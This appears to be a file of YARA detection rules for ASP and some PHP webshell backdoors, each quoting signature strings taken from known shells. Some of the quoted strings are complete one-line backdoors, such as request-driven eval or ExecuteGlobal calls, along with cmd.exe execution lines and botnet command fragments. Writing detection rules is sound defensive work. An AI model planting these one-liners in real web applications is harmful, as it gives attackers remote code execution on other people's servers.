rule Backdoor_Webshell_ASP_000752
{
    meta:
        description = "generated from file aaa.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s0 = "Function fvm(jwv):If jwv=\"\"Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt=\""
        $s5 = "<option value=\"\"DROP TABLE [jnc];exec mast\"&kvp&\"er..xp_regwrite 'HKEY_LOCAL"
        $s17 = "if qpv=\"\" then qpv=\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\"&br&"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_ASP_000753
{
    meta:
        description = "generated from file expdoor.com asp.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s4 = "\">www.Expdoor.com</a>"
        $s5 = "    <input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" max"
        $s10 = "set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '"
        $s14 = "set fs=server.CreateObject(\"Scripting.FileSystemObject\")   '"
        $s16 = "<TITLE>Expdoor.com ASP"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_ASP_000754
{
    meta:
        description = "generated from file bypass-iisuser-p.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s0 = "<%Eval(Request(chr(112))):Set fso=CreateObject"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000755
{
    meta:
        description = "generated from file radhat.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s1 = "sod=Array(\"D\",\"7\",\"S"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000756
{
    meta:
        description = "generated from file asp1.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s0 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave "
        $s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_ASP_000757
{
    meta:
        description = "generated from file asp.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-03-28"
        
    strings:
        $s1 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")"
        $s2 = "Function MorfiCoder(Code)"
        $s3 = "MorfiCoder=Replace(Replace(StrReverse(Code),\"/*/\",\"\"\"\"),\"\\*\\\",vbCrlf)"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_ASP_000758
{
    meta:
        description = "semi-auto-generated tool.asp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "mailto:rhfactor@antisocial.com"
        $s2 = "?raiz=root"
        $s3 = "DIGO CORROMPIDO<BR>CORRUPT CODE"
        $s4 = "key = \"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_ASP_000759
{
    meta:
        description = "semi-auto-generated nt addy.asp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "NTDaddy v1.9 by obzerve of fux0r inc"
        $s2 = "<ERROR: THIS IS NOT A TEXT FILE>"
        $s4 = "RAW D.O.S. COMMAND INTERFACE"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_ASP_000760
{
    meta:
        description = "semi-auto-generated remexp.asp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<title>Remote Explorer</title>"
        $s3 = " FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFi"
        $s4 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_ASP_000761
{
    meta:
        description = "semi-auto-generated klasvayv.asp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "set aktifklas=request.querystring(\"aktifklas\")"
        $s2 = "action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>"
        $s3 = "<font color=\"#858585\">www.aventgrup.net"
        $s4 = "style=\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_ASP_000762
{
    meta:
        description = "semi-auto-generated reader.asp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "Mehdi & HolyDemon"
        $s2 = "www.infilak."
        $s3 = "'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\"75%"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_ASP_000763
{
    meta:
        description = "semi-auto-generated elmaliseker.asp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\""
        $s1 = "<form name=frmCMD method=post action=\"<%=gURL%>\">"
        $s2 = "dim zombie_array,special_array"
        $s3 = "http://vnhacker.org"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_ASP_000764
{
    meta:
        description = "semi-auto-generated indexer.asp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
        $s2 = "D7nD7l.km4snk`JzKnd{n_ejq;bd{KbPur#kQ8AAA==^#~@%>></td><td><input type=\"submit"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_ASP_000765
{
    meta:
        description = "semi-auto-generated kacak.asp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "Kacak FSO 1.0"
        $s1 = "if request.querystring(\"TGH\") = \"1\" then"
        $s3 = "<font color=\"#858585\">BuqX</font></a></font><font face=\"Verdana\" style="
        $s4 = "mailto:BuqX@hotmail.com"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_ASP_000766
{
    meta:
        description = "semi-auto-generated Zehir 4.asp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time="
        $s4 = "<input type=submit value=\"Test Et!\" onclick=\""
        
    condition:
        1 of them
}
rule Backdoor_Webshell_ASP_000767
{
    meta:
        description = "PHP.github archive remexp.asp.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "lsExt = Right(FileName, Len(FileName) - liCount)"
        $s7 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
        $s13 = "Response.Write Drive.ShareName & \" [share]\""
        $s19 = "If Request.QueryString(\"CopyFile\") <> \"\" Then"
        $s20 = "<td width=\"40%\" height=\"20\" bgcolor=\"silver\">  Name</td>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000768
{
    meta:
        description = "PHP.github archive indexer.asp.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<meta http-equiv=\"Content-Language\" content=\"tr\">"
        $s1 = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>"
        $s2 = "<form action=\"?Gonder\" method=\"post\">"
        $s4 = "<form action=\"?oku\" method=\"post\">"
        $s7 = "var message=\"SaNaLTeRoR - "
        $s8 = "nDexEr - Reader\""
        
    condition:
        3 of them
}
rule Backdoor_Webshell_ASP_000769
{
    meta:
        description = "PHP.github archive reader.asp.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s5 = "ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail"
        $s12 = " HACKING "
        $s16 = "FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: "
        $s20 = "PADDING-RIGHT: 8px; PADDING-LEFT: 8px; FONT-WEIGHT: bold; FONT-SIZE: 11px; BACKG"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_ASP_000770
{
    meta:
        description = "PHP.github archive cmdasp.asp.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $a0 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )"
        $a1 = "' Author: Maceo <maceo @ dogmile.com>"
        $a2 = "' -- Use a poor man's pipe ... a temp file -- '"
        $a3 = "' --------------------o0o--------------------"
        $a4 = "' File: CmdAsp.asp"
        $a5 = "<-- CmdAsp.asp -->"
        $a6 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
        $a7 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")"
        $a8 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>"
        
        $b0 = "' -- Read the output from our command and remove the temp file -- '"
        $b1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
        $b2 = "' -- create the COM objects that we will be using -- '"
        
        $c0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>"
        $c1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
        
        $d0 = "CmdAsp.asp"
        $d1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")"
        $d2 = "-- Use a poor man's pipe ... a temp file --"
        $d3 = "maceo @ dogmile.com"
        
    condition:
        4 of ($a*) or all of ($b*) or all of ($c*) or 2 of ($d*)
}
rule Backdoor_Webshell_ASP_000771
{
    meta:
        description = "PHP.github archive zehir4.asp.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s4 = "response.Write \"<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&"
        $s11 = "frames.byZehir.document.execCommand("
        $s15 = "frames.byZehir.document.execCommand(co"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_ASP_000772
{
    meta:
        description = "PHP.github archivefrom files ph vayv.php, phvayv.php, ph_vayv.php, klasvayv.asp.php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s1 = "<font color=\"#000000\">Sil</font></a></font></td>"
        $s5 = "<td width=\"122\" height=\"17\" bgcolor=\"#9F9F9F\">"
        $s6 = "onfocus=\"if (this.value == 'Kullan"
        $s16 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\">"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_ASP_000773
{
    meta:
        description = "auto-generated fso.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<!-- PageFSO Below -->"
        $s1 = "theFile.writeLine(\"<script language=\"\"vbscript\"\" runat=server>if request(\"\"\"&cli"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000774
{
    meta:
        description = "auto-generated config.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "const adminPassword=\""
        $s2 = "const userPassword=\""
        $s3 = "const mVersion="
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000775
{
    meta:
        description = "auto-generated zehir4.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s5 = " byMesaj "
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000776
{
    meta:
        description = "auto-generated reader.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "mailto:mailbomb@hotmail."
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000777
{
    meta:
        description = "auto-generated server.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<!-- PageServer Below -->"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000778
{
    meta:
        description = "auto-generated admin-ad.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s6 = "<td align=\"center\"> <input name=\"cmd\" type=\"text\" id=\"cmd\" siz"
        $s7 = "Response.write\"<a href='\"&url&\"?path=\"&Request(\"oldpath\")&\"&attrib=\"&attrib&\"'><"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000779
{
    meta:
        description = "auto-generated 2005gray.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "SCROLLBAR-FACE-COLOR: #e8e7e7;"
        $s4 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
        $s8 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
        $s9 = "SCROLLBAR-3DLIGHT-COLOR: #cccccc;"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000780
{
    meta:
        description = "auto-generated cmd.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>"
        $s1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000781
{
    meta:
        description = "auto-generated indexer.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s3 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input type=\"r"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000782
{
    meta:
        description = "auto-generated 2005red.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "scrollbar-darkshadow-color:#FF9DBB;"
        $s3 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
        $s9 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000783
{
    meta:
        description = "auto-generated elmaliseker.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "javascript:Command('Download'"
        $s5 = "zombie_array=array("
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000784
{
    meta:
        description = "auto-generated remexp.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Request.Ser"
        $s5 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f=<%=F"
        $s6 = "<td bgcolor=\"<%=BgColor%>\" align=\"right\"><%=Attributes(SubFolder.Attributes)%></"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000785
{
    meta:
        description = "auto-generated tool.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s7 = "\"\"%windir%\\\\calc.exe\"\")"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000786
{
    meta:
        description = "auto-generated 2005.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "window.open(\"\"&url&\"?id=edit&path=\"+sfile+\"&op=copy&attrib=\"+attrib+\"&dpath=\"+lp"
        $s3 = "<input name=\"dbname\" type=\"hidden\" id=\"dbname\" value=\"<%=request(\"dbname\")%>\">"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000787
{
    meta:
        description = "auto-generated ntdaddy.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "<input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"s"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000788
{
    meta:
        description = "auto-generated upload.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<!-- PageUpload Below -->"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000789
{
    meta:
        description = "auto-generated remexp.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = " Then Response.Write \""
        $s3 = "<a href= \"<%=Request.ServerVariables(\"script_name\")%>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000790
{
    meta:
        description = "auto-generated commands.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "If CheckRecord(\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \" & VictimID"
        $s2 = "proxyArr = Array (\"HTTP_X_FORWARDED_FOR\",\"HTTP_VIA\",\"HTTP_CACHE_CONTROL\",\"HTTP_F"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000791
{
    meta:
        description = "auto-generated efso_2.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = ";!+/DRknD7+.\\mDrC(V+kcJznndm\\f|nzKuJb'r@!&0KUY@*Jb@#@&Xl\"dKVcJ\\CslU,),@!0KxD~mKV"
        $s4 = "\\co!VV2CDtSJ'E*#@#@&mKx/DP14lM/nY{JC81N+6LtbL3^hUWa;M/OE-AXX\"b~/fAs!u&9|J\\grKp\"j"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000792
{
    meta:
        description = "auto-generated 2005.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s6 = "\" onclick=\"this.form.sqlStr.value='e:\\hytop.mdb"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000793
{
    meta:
        description = "auto-generated xssshell.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "if( !getRequest(COMMANDS_URL + \"?v=\" + VICTIM + \"&r=\" + generateID(), \"pushComma"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000794
{
    meta:
        description = "auto-generated db.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s8 = "'// By Ferruh Mavituna | http://ferruh.mavituna.com"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000795
{
    meta:
        description = "auto-generated default.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s3 = "If ProxyData <> \"\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \"<br />\")"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000796
{
    meta:
        description = "auto-generated fmlibraryv3.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s3 = "ExeNewRs.CommandText = \"UPDATE \" & tablename & \" SET \" & ExeNewRsValues & \" WHER"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000797
{
    meta:
        description = "auto-generated connector.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "If ( AttackID = BROADCAST_ATTACK )"
        $s4 = "Add UNIQUE ID for victims / zombies"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000798
{
    meta:
        description = "auto-generated php_shell_v1.7.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s8 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000799
{
    meta:
        description = "auto-generated save.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s4 = "RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID"
        $s5 = "VictimID = fm_NStr(Victims(i))"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000800
{
    meta:
        description = "auto-generated ajan.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s4 = "entrika.write \"BinaryStream.SaveToFile"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000801
{
    meta:
        description = "auto-generated zehir4.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s4 = "\"Program Files\\Serv-u\\Serv"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000802
{
    meta:
        description = "auto-generated indexer.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s5 = "<td>Nerden :<td><input type=\"text\" name=\"nerden\" size=25 value=index.html></td>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000803
{
    meta:
        description = "auto-generated 2005.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s7 = "theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\")"
        $s8 = "scrollbar-darkshadow-color:#9C9CD3;"
        $s9 = "scrollbar-face-color:#E4E4F3;"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000804
{
    meta:
        description = "auto-generated asp.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000805
{
    meta:
        description = "auto-generated efso_2.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = ";!+/DRknD7+.\\mDrC(V+kcJznndm\\f|nzKuJb'r@!&0KUY@*Jb@#@&Xl\"dKVcJ\\CslU,),@!0KxD~mKV"
        $s4 = "\\co!VV2CDtSJ'E*#@#@&mKx/DP14lM/nY{JC81N+6LtbL3^hUWa;M/OE-AXX\"b~/fAs!u&9|J\\grKp\"j"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000806
{
    meta:
        description = "auto-generated down.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "response.write \"<font color=blue size=2>NetBios Name: \\\\\"  & Snet.ComputerName &"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000807
{
    meta:
        description = "auto-generated cmdshell.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "if cmdPath=\"wscriptShell\" then"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000808
{
    meta:
        description = "auto-generated 2006.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s6 = "strBackDoor = strBackDoor "
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000809
{
    meta:
        description = "auto-generated ajan.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "\"Set WshShell = CreateObject(\"\"WScript.Shell\"\")"
        $s3 = "/file.zip"
        
    condition:
        all of them
}
rule Backdoor_Webshell_ASP_000810
{
    meta:
        description = "elmaliseker.asp, zehir.asp, zehir.txt, zehir4.asp, zehir4.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-01-11"
        
    strings:
        $s1 = "for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';" ascii
        $s2 = "if (frmUpload.max.value<=0) frmUpload.max.value=1;" ascii
        
    condition:
        filesize < 200KB and 1 of them
}
rule Backdoor_Webshell_ASP_000811
{
    meta:
        description = "cn honker pentest toolset rootkit.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "set ss=zsckm.get(\"Win32_ProcessSta\"&uyy&\"rtup\")" fullword ascii /* PEStudio Blacklist: strings */
        $s1 = "If jzgm=\"\"Then jzgm=\"cmd.exe /c net user\"" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 80KB and all of them
}